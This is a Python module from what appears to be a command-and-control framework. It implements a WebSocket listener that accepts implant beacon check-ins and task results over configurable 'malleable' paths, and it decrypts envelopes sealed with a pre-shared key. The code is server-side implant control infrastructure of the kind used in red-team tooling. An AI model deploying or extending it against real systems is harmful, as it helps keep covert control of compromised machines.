"""WebSocket beacon channel for malleable WS profiles."""

from __future__ import annotations

import logging
from typing import Any

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from squidc5.profiles.http_beacon import process_beacon_checkin, process_beacon_result

log = logging.getLogger("squidc5.listeners.ws")


def build_ws_router() -> APIRouter:
    router = APIRouter(tags=["ws-beacon"])

    @router.websocket("/ws/v1/beacon")
    async def ws_beacon_default(websocket: WebSocket) -> None:
        await _ws_loop(websocket)

    @router.websocket("/ws/{full_path:path}")
    async def ws_beacon_profile(websocket: WebSocket, full_path: str) -> None:
        path = "/ws/" + full_path
        state = websocket.app.state.app_state
        # accept if matches any WS profile path or default
        allowed = {"/ws/v1/beacon"}
        for p in state.profiles.list_profiles():
            if p.get("channel") == "ws":
                wp = (p.get("ws") or {}).get("path") or ""
                if wp:
                    allowed.add(wp if wp.startswith("/") else f"/{wp}")
        act = state.profiles.active()
        if act and act.channel == "ws" and act.ws.path:
            allowed.add(act.ws.path if act.ws.path.startswith("/") else f"/{act.ws.path}")
        if path not in allowed and f"/{full_path}" not in allowed:
            await websocket.close(code=1008)
            return
        await _ws_loop(websocket)

    return router


async def _ws_loop(websocket: WebSocket) -> None:
    state = websocket.app.state.app_state
    if not await state.features.enabled("implant_beacon"):
        await websocket.close(code=1008)
        return
    await websocket.accept()
    client = websocket.client.host if websocket.client else None
    try:
        while True:
            msg: dict[str, Any] = await websocket.receive_json()
            # C06: sealed envelopes put type inside ciphertext — unwrap first
            from squidc5.implants.crypto import is_envelope, open_envelope

            inner = msg
            if is_envelope(msg):
                psk = getattr(state, "implant_psk", "") or ""
                require = bool(getattr(state.settings, "implant_require_auth", True))
                if require or psk:
                    try:
                        if not psk:
                            raise PermissionError("PSK missing")
                        inner = open_envelope(psk, msg)
                    except Exception:
                        await websocket.close(code=1008)
                        return
            kind = str(inner.get("type") or msg.get("type") or "beacon")
            # process_* also unwraps; pass original envelope when sealed for auth
            wire = msg if is_envelope(msg) else inner
            if kind == "result":
                out = await process_beacon_result(state, wire)
            else:
                out = await process_beacon_checkin(
                    state,
                    remote_addr=client,
                    payload=wire,
                    user_agent="ws-beacon",
                )
            await websocket.send_json(out)
            await state.metrics.incr("ws.messages")
    except WebSocketDisconnect:
        return
    except Exception:
        log.exception("WS beacon error")
        try:
            await websocket.close(code=1011)
        except Exception:
            pass
